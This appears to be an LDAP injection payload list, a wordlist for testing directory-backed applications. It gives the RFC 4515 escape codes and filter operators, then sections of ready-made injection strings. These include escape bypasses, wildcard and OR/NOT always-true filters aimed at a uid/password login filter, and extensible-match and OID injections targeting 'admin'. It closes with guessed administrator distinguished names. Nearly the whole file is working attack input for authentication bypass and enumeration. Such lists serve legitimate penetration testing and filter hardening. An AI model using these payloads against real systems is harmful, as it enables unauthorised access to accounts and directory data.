# ============================================================
# LDAP Injection — Filter Escape & Special Syntax
# ============================================================

# ---- LDAP Special Characters (RFC 4515) ----
# Must be escaped: * ( ) \ NUL
\2a  = *
\28  = (
\29  = )
\5c  = \
\00  = NUL (null byte)

# ---- Escape Bypass (when filter is improperly escaped) ----
\2a\29\28\7c\28
\2a\29\28\26
*))(|(
*))(|(cn=*

# ---- Filter Operators ----
& — AND
| — OR
! — NOT
= — Equality
~= — Approximate match
>= — Greater or equal
<= — Less or equal
* — Wildcard
dn: — Distinguished name filter

# ---- Logical Operator Injection ----
# Inject into: (&(uid=USER)(password=PASS))
USER*)(&
USER*)(|(uid=*)

# ---- OR Injection ----
# Inject into: (uid=INPUT)
*(|(uid=*)
*(|(cn=*)(uid=*)

# ---- NOT Injection ----
# Always true via NOT:
*(!(cn=nonexistent))

# ---- Extensible Match Injection ----
*(cn:dn:=admin)
*(cn:2.5.13.3:=admin)

# ---- OID Injection ----
*(objectClass:extensibleObject:=*)
*(1.3.6.1.4.1.1466.115.121.1.15:=admin)

cn=admin,dc=example,dc=com
cn=Administrator,cn=Users,dc=domain,dc=com
uid=admin,ou=users,dc=example,dc=com
ou=People,dc=example,dc=com
dc=example,dc=com
